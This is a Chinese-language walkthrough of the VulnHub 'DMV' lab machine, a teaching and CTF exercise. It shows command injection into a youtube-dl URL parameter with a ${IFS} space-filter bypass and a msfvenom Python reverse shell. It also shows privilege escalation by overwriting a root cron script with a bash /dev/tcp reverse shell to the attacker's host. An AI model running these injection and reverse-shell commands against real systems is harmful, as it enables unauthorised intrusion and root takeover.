## DMV: Walkthrough

### 主机识别

`nmap -sn 192.168.1.1/24`

### 网络拓扑

| 计算机 | IP              |
| ------ | --------------- |
| Kali   | `192.168.1.105` |
| DMV    | `192.168.1.110` |

### 扫描端口和版本信息

`nmap -A 192.168.1.110`

![1](../src/vulnhub/dmv/1.png)

### 访问Web并确定web应用

访问 *80* 端口有个输入框，此外查看网页源码发现一个 JS 脚本。大意就是将用户输入的内容作为值与字符串（*`https://www.youtube.com/watch?v=`*）结合传递给 *yt_url* 参数，并根据返回结果做出相应输出，因此这里可能存在命令注入漏洞

![2](../src/vulnhub/dmv/2.png)

![3](../src/vulnhub/dmv/3.png)

在输出框里输入 *123*，并转到 BP 上进行操作

![4](../src/vulnhub/dmv/4.png)

根据返回的报错信息可以确定服务器端运行 **youtube-dl** 这一下载 YouTube 上视频的命令行程序，通过查看支持的参数，发现 `--exec` 参数可以执行命令

![5](../src/vulnhub/dmv/5.png)

结果经过多次尝试发现并不能正常执行，同时也确定服务器端存在字符过滤。要想知道哪些字符被过滤，哪些字符没有过滤，那么就需要进行 Fuzzing 

> 使用 [SecLists](https://github.com/danielmiessler/SecLists) 字典库中 Fuzzing 部分的 *special-chars.txt* 字典进行操作

![6](../src/vulnhub/dmv/6.png)

根据返回结果的不同，可以发现返回结果中带 *sh: 1: cannot open* 字符串的都是没有被过滤的字符，因此对执行结果进行过滤后确定以下字符没有被过滤

```
(
)
&
`
|
'
"
<
;
```

![7](../src/vulnhub/dmv/7.png)

其中反引号在 Linux 系统中可以执行命令，比如 

```
echo `ls`
```

此外分号起到分隔命令的作用，多次尝试后如下传参，命令可以正常执行

![8](../src/vulnhub/dmv/8.png)

但是当命令中存在空格时也会被过滤

![9](../src/vulnhub/dmv/9.png)

采用 Linux 中[空格绕过](https://www.freebuf.com/articles/web/137923.html)方法，将空格替换为`${IFS}`可以绕过

![10](../src/vulnhub/dmv/10.png)

### 寻找 Flag 文件

![11](../src/vulnhub/dmv/11.png)

在 `/var/www/html/admin` 目录下存在 *flag.txt* 文件，因此如下传参就可以读到文件内容

```
yt_url=%3c`cat${IFS}/var/www/html/admin/flag.txt`
```

接下来的步骤就是读 */root* 目录下的 flag 文件了。为了操作方便，进行 getshell

> 本机（Kali）开启 **8088** 端口（`python3 -m http.server 8088`），并且在目录下使用 *msfvenom* 生成反向 shell 脚本
>
> `msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.105 LPORT=8866 -f raw > recvshell.py`

![12](../src/vulnhub/dmv/12.png)

在本机监听 **8866** 端口，就可以 getshell

![13](../src/vulnhub/dmv/13.png)

得到 *itsmeadmin* 账号密码和一段 shell 脚本 （*clean.sh*)

```
rm - rf downloads
```

看来在此之前将 *downloads* 目录给删除了，这时想到 CTF 中遇到脚本的常见套路就是定时任务 *crontab* 了，因此我们将此连接转到 *bash*

![14](../src/vulnhub/dmv/14.png)

本机监听 **4466** 端口，并在 GitHub 上下载 [pspy](https://github.com/DominicBreuker/pspy) 程序，该程序的功能就是旨在无需 root 权限即可监听进程。因此我们可以查看是否存在 *cron* 进程。这里我们根据虚拟机的信息下载 64 位的程序

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
./pspy64
```

![15](../src/vulnhub/dmv/15.png)

可以看到 root 用户使用 *cron* 每一分钟自动执行 *clean.sh* 脚本。接下来的工作很明显，只要我们把脚本写到 clean.sh 文件就会被 root 用户自动执行，因此执行该命令

`echo "bash -c 'bash -i >& /dev/tcp/192.168.1.105/4455 0>&1'" > /var/www/html/tmp/clean.sh`

本机监听 **4455** 端口，再过一分钟就可以拿到 root 权限

![16](../src/vulnhub/dmv/16.png)

